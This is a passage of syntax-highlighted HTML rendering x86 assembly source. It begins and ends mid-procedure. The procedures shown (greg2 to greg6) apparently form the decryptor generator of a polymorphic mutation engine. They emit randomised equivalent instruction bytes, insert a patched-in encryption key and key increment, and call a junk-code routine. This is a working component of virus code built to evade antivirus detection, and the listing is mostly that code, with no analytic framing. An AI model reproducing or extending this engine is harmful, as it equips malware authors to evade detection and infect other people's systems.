    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">s_next0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">s_next1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">s_next2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">s_next3</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;MOV reg, random_value</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">              </span><span class="sc1">;XOR reg, value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;param = random_value xor value</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_end2</span><span class="sc0">
</span><span class="sc5">s_next0</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">             </span><span class="sc1">;PUSH random_value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;POP reg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;XOR reg, value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;result = random_value xor value</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor2</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_end2</span><span class="sc0">
</span><span class="sc5">s_next1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;MOV EAX, random_value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;MOV reg, EAX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;SUB reg, value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;result = random_value - value</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_end2</span><span class="sc0">
</span><span class="sc5">s_next2</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;XOR reg, reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">              </span><span class="sc1">;XOR reg, random_value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">               </span><span class="sc1">;ADD reg, value</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;result = random_value + value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">s_lbl</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_end2</span><span class="sc0">
</span><span class="sc5">s_lbl</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">             </span><span class="sc1">;create ADD reg, ... instruction</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">s_next3</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;XOR reg, reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">              </span><span class="sc1">;ADD reg, random_value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">               </span><span class="sc1">;XOR reg, value</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;result = random_value xor value</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">s_lbl</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor2</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
</span><span class="sc5">n_end2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc5">Pshd</span><span class="sc0">
</span><span class="sc5">greg2</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">greg3</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">                </span><span class="sc1">;get register</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">;already used ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">          </span><span class="sc1">;get encryption key value</span><span class="sc0">
</span><span class="sc5">xor_key</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">k_next1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">k_next2</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;XOR reg, reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">              </span><span class="sc1">;OR, ADD, XOR reg, value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">k_nxt2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">k_nxt3</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
</span><span class="sc5">k_nxt1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">n_end1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">k_end</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">k_nxt2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">k_nxt1</span><span class="sc0">
</span><span class="sc5">k_nxt3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">k_nxt1</span><span class="sc0">
</span><span class="sc5">k_next1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;MOV reg, value</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">k_nxt1</span><span class="sc0">
</span><span class="sc5">k_next2</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">             </span><span class="sc1">;PUSH value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;POP reg</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_end1</span><span class="sc0">
</span><span class="sc5">greg3</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">greg4</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">          </span><span class="sc1">;get key increment value</span><span class="sc0">
</span><span class="sc5">key_inc</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">i_next</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_next0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_next1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_next2</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">;XCHG EAX, reg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">              </span><span class="sc1">;XOR reg, reg</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;OR reg, EAX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;ADD reg, value</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">i_next0</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">             </span><span class="sc1">;ADD reg, value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_end1</span><span class="sc0">
</span><span class="sc5">i_next1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;MOV EAX, value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;ADD reg, EAX</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">i_end1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">i_end2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">i_next2</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc0">             </span><span class="sc1">;MOV EAX, reg</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;ADD EAX, value</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">                </span><span class="sc1">;XCHG EAX, reg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_end1</span><span class="sc0">
</span><span class="sc5">greg4</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">greg5</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ng5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">i_next</span><span class="sc0">             </span><span class="sc1">;same as previous, value=4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">k_end</span><span class="sc0">
</span><span class="sc5">ng5</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">             </span><span class="sc1">;4x inc reg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_end1</span><span class="sc0">
</span><span class="sc5">greg5</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">greg6</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">d_next0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">d_next1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">d_next2</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc0">             </span><span class="sc1">;SUB reg, 1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
